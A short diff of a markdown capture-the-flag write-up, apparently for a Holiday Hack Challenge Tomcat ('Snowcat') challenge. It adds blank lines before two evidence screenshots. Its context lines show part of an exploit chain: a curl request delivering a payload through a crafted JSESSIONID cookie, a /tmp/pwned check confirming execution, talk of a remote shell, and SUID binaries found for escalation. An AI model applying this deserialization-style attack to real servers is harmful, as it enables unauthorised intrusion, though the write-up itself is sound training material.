@@ -34,6 +34,7 @@ curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
 ls -la /tmp/pwned 2>/dev/null && echo "SUCCESS with touch!" || echo "Failed"
 ```
 The initial payload was delivered and successful:
+
 ![Tomcat Initial Payload Evidence](https://mitchdarrow.github.io/HHC_2025_Template/images/snowcat_initialpayload.jpg) 
 
 To achieve a remote shell, the following approach was used:
@@ -71,6 +72,7 @@ curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
 ```
 
 This resulted in access as the identity running the web service:
+
 ![Snowcat Service Account User](https://mitchdarrow.github.io/HHC_2025_Template/images/snowcat_serviceaccount.jpg) 
 
 Three binaries were discovered that the service account has access to with the SUID set:
